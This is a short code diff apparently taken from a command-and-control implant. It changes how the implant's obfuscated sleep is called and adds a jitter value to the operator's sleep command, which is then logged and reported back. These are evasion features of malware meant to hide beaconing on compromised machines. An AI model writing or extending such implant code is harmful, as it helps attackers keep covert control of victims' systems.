@@ -64,7 +64,7 @@ VOID CommandDispatcher( VOID )
         if ( ! Instance.Session.Connected )
             break;
 
-        SleepObf( Instance.Config.Sleeping * 1000 );
+        SleepObf();
 
 #ifdef TRANSPORT_HTTP
         /* Send our buffer. */
@@ -170,9 +170,12 @@ VOID CommandSleep( PPARSER Parser )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_SLEEP );
 
     Instance.Config.Sleeping = ParserGetInt32( Parser );
+    Instance.Config.Jitter   = ParserGetInt32( Parser );
     PRINTF( "Instance.Sleeping: [%d]\n", Instance.Config.Sleeping );
+    PRINTF( "Instance.Jitter  : [%d]\n", Instance.Config.Jitter );
 
     PackageAddInt32( Package, Instance.Config.Sleeping );
+    PackageAddInt32( Package, Instance.Config.Jitter );
     PackageTransmit( Package, NULL, NULL );
 }
 
